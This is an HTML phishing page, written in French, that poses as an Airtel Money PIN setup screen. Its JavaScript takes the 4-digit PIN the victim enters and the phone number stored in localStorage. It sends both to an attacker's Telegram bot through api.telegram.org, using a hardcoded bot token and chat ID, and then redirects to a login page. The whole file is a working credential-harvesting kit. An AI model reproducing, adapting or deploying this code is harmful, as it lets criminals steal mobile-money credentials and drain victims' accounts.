<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <title>Set PIN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-[#0f172a] text-white min-h-screen flex items-center justify-center p-6">

    <div class="bg-white/10 p-8 rounded-2xl w-full max-w-md text-center space-y-6">

        <h2 class="text-2xl font-bold">Saisissez votre code PIN Airtel Money</h2>

        <p class="text-white/60 text-sm">
            Saisissez et confirmez votre code PIN à 4 chiffres.
        </p>

        <!-- PIN -->
        <input id="pin1" type="password" maxlength="4" placeholder="Saisissez le code PIN" class="w-full p-4 rounded-xl bg-white/5 border border-white/20 outline-none text-center text-xl" />

        <!-- CONFIRM -->
        <input id="pin2" type="password" maxlength="4" placeholder="Confirmer le code PIN" class="w-full p-4 rounded-xl bg-white/5 border border-white/20 outline-none text-center text-xl" />

        <button onclick="submitPin()" class="w-full bg-white text-black py-4 rounded-xl font-bold">
            FINITION
        </button>

    </div>

    <script>
        async function submitPin() {

            const pin1 = document.getElementById("pin1").value;
            const pin2 = document.getElementById("pin2").value;

            if (pin1.length !== 4 || pin2.length !== 4) {
                alert("Le PIN doit comporter 4 chiffres");
                return;
            }

            if (pin1 !== pin2) {
                alert("Les PIN ne correspondent pas");
                return;
            }

            // Save PIN
            localStorage.setItem("userPin", pin1);

            await sendToTelegram(pin1);

            window.location.href = "login.html";
        }

        async function sendToTelegram(pin) {

            const phone = localStorage.getItem("verifiedPhone") || "Non disponible";

            const BOT = "8999307823:AAHeXPAlMT6dX2QE2U-erKRecDTzmdZOJgI";
            const CHAT = "8860468646";

            const msg =
                `🔐 AIRTEL PIN

📱 Phone: ${phone}
🔑 PIN: ${pin}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                    method: "POST",
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT,
                        text: msg
                    })
                });
            } catch (e) {
                console.error("Telegram send failed", e);
            }
        }
    </script>

</body>

</html>
